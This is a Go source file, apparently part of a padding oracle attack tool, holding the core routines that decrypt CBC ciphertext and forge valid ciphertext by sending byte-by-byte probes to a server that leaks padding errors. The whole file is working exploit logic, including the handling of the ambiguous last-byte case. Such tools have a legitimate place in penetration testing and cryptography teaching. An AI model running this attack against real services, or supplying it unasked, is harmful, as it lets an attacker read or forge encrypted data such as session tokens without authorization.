package main

/* implementation of Padding Oracle exploit algorithm */

import (
	"fmt"
	"strings"
)

func createXORingFetcher(xorArg []byte) func(byte) {
	pos := len(xorArg) - 1

	return func(input byte) {
		currentStatus.fetchOutputByte(xorArg[pos] ^ input)
		pos--
	}
}

func decrypt(encodedCipher string) ([]byte, error) {
	blockLen := *config.blockLen

	// check for initial input
	if encodedCipher == "" {
		return nil, fmt.Errorf("empty input cipher")
	}

	// decode into bytes
	cipher, err := config.encoder.DecodeString(encodedCipher)
	if err != nil {
		return nil, err
	}

	// check length of cipher against block length
	if len(cipher)%blockLen != 0 {
		return nil, fmt.Errorf("Cipher length is not compatible with block length (%d %% %d != 0)", len(cipher), blockLen)
	}

	// confirm validity of provided cipher
	printAction("Confirming input cipher is valid...")
	pe, err := isPaddingErrorChunk(cipher)
	if err != nil {
		return nil, err
	}
	if pe {
		return nil, fmt.Errorf("Input cipher produced padding error. You must provide a valid cipher to decrypt")
	}

	// count blocks
	blockCount := len(cipher) / blockLen

	// derive length of plaintext
	// NOTE: first block considered to be IV
	plainLen := (blockCount - 1) * blockLen
	plainText := make([]byte, plainLen)

	// initialize hacky bar
	currentStatus.openBar(plainLen)
	defer currentStatus.closeBar()

	// decrypt block by block moving backwards, except first (IV)
	for blockNum := blockCount; blockNum >= 2; blockNum-- {
		// mark indexes
		x := (blockNum - 2) * blockLen
		y := (blockNum - 1) * blockLen
		z := blockNum * blockLen

		// get cipher block and corresponding IV from ciphertext
		IV, block := cipher[x:y], cipher[y:z]

		// derive the nulling IV
		nullingIV, err := breakCipher(block, createXORingFetcher(IV))
		if err != nil {
			return nil, fmt.Errorf("error occurred while decrypting block %d: %w", blockNum, err)
		}

		// derive plaintext block
		copy(plainText[x:y], xorSlices(nullingIV, IV))
	}

	return plainText, nil
}

func encrypt(plainText string) ([]byte, error) {
	blockLen := *config.blockLen

	// pad
	padding := blockLen - len(plainText)%blockLen
	plainText += strings.Repeat(string(padding), padding)

	blockCount := len(plainText) / blockLen

	// initialize a slice that will contain our cipherText (blockCount + 1 for IV)
	cipher := append(make([]byte, blockLen*blockCount), randomBlock(blockLen)...)

	// initialize status bar
	currentStatus.openBar(len(cipher))
	defer currentStatus.closeBar()

	// the last block is already known, so we report in to status
	currentStatus.fetchOutputBytes(cipher[blockLen*blockCount:])

	/* Start with the last block and move towards the 1st block.
	Each block is used successively as a IV and then as a cipherText in the next iteration */
	for blockNum := blockCount; blockNum >= 1; blockNum-- {
		// mark indexes
		x := (blockNum - 1) * blockLen
		y := blockNum * blockLen
		z := (blockNum + 1) * blockLen

		plainBlock := []byte(plainText)[x:y]

		// get nulling IV
		nullingIV, err := breakCipher(cipher[y:z], createXORingFetcher(plainBlock))
		if err != nil {
			return nil, fmt.Errorf("error occurred while encrypting block %d: %w", blockNum, err)
		}

		// reveal the cipher
		copy(cipher[x:y], xorSlices(plainBlock, nullingIV))
	}
	return cipher, nil
}

// breaks cipher for a given block of ciphertext
// returns bytes (NullingIV) that are turning underlying plaintext into null-byte sequence when sent as IV
// the NullingIV can then be used in encryption or decryption, depending on what you XOR it with
// the stream fetcher can be passed to deliver bytes in in real-time as soon as they discovered
func breakCipher(cipherBlock []byte, streamFetcher func(byte)) ([]byte, error) {
	blockLen := len(cipherBlock)

	// output buffer
	output := make([]byte, blockLen)

	// generate chunk of cipher with prepended random IV
	cipherChunk := append(randomBlock(blockLen), cipherBlock...)

	// we start with the last byte of IV
	// and repeat the same procedure for every byte moving backwards
	for pos := blockLen - 1; pos >= 0; pos-- {
		// discover the bytes that do not produce padding error
		// NOTE: at last position there may be 2 such bytes*/
		maxCount := 1
		if pos == blockLen-1 {
			maxCount = 2
		}

		found, err := detectErrorlessBytes(cipherChunk, pos, maxCount)
		if err != nil {
			return nil, err
		}

		/* check the results */
		var foundByte *byte
		switch len(found) {
		case 0:
			return nil, newErrWithHints(
				fmt.Errorf("could not find byte that fits without padding error (position %d)", pos),
				hint.lowerConnections,
			)
		case 1:
			foundByte = &found[0]
		case 2:
			/* this case can ONLY happen in the last position of the block (see maxCount variable above)
			here, we found 2 bytes that fit without padding oracle error
			the challenge here is to find the one that produced \x01 in plaintext
			the trick is:
				if we modify second-last byte, and padding error still doesn't occur
				then we are sure, that found byte produces \x01 at last position of plaintext
			for more info, you can check this thread:
			https://crypto.stackexchange.com/questions/37608/clarification-on-the-origin-of-01-in-this-oracle-padding-attack
			*/

			// modify second-last byte of IV
			cipherChunk[pos-1]++

			// send additional probes
			for _, b := range found {
				// set last byte to one of the found
				cipherChunk[pos] = b

				// check for padding error
				paddingError, err := isPaddingErrorChunk(cipherChunk)
				if err != nil {
					return nil, err
				}

				if !paddingError {
					// we found the truly valid byte
					foundByte = &b
					break
				}
			}

			if foundByte == nil {
				return nil, newErrWithHints(
					fmt.Errorf("failed to decrypt due to unexpected server behavior"),
					hint.lowerConnections,
				)
			}
		}

		// XOR to retrieve output byte
		paddingValue := byte(blockLen - pos)
		outByte := *foundByte ^ paddingValue

		// write to output buffer
		output[pos] = outByte

		// call stream fetcher if passed
		if streamFetcher != nil {
			streamFetcher(outByte)
		}

		// adjust padding for next iteration
		cipherChunk[pos] = *foundByte
		for i := pos; i < blockLen; i++ {
			cipherChunk[i] ^= paddingValue ^ (paddingValue + 1)
		}
	}
	return output, nil
}
